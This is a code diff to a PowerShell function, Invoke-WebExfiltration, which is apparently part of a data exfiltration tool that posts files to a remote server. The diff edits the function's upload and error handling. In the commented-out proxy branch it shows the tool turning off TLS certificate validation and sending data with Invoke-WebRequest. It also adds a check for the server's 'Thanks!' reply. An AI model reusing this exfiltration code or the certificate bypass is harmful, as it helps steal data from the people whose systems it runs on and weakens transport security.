@@ -171,10 +171,9 @@ Function Invoke-WebExfiltration {
 
         try {
             if ($Proxy){
-                $uriProxy = [uri]::EscapeUriString($Proxy)
-
-                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-                Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
+                # $uriProxy = [uri]::EscapeUriString($Proxy)
+                # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+                # Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
                 Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"
 
             } else {
@@ -194,16 +193,12 @@ Function Invoke-WebExfiltration {
 
             if ($message -like "No connection could be made*"){
                 Write-Host "[X] Error: Could not connect to the server. Got this error: '$($_.Exception.Message)'"
-            } elseif ($response_code -eq '400') {
-                Write-Host "[X] Error: Got HTTP code '400' from server."
-                Write-Host "[X] Error: This means that the server could not decrypt the file. Thus, the file was NOT exfiltrated!"
-                Write-Host "[X] Error: Did you specify the wrong password?"
-            } else {
+            }
+             else {
                 Write-Host "[X] Error: Got unexpected response code '$response_code' from server"
                 Write-Host "[X] Error: Message from server: '$message'"
             }
              Break
-
         }
         #catch {
         #    Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
@@ -219,7 +214,14 @@ Function Invoke-WebExfiltration {
                 Write-Host "[X] Error: Message from server: '$($response.Content)'"
         }
 
-         Write-Verbose "Uploaded '$file_name'. Server returned message: '$($response.Content)'"
+         Write-Verbose "Uploaded '$file_name'"
+         Write-Verbose "Server returned message: '$($response.Content)'"
+
+         if ($response.Content -ne 'Thanks!'){
+             Write-Host "[X] Error: Host returned '$($response.Content)'"
+             Write-Host "[X] Upload was not successfull. Something is wrong."
+             break
+         }
     }
 
      End {
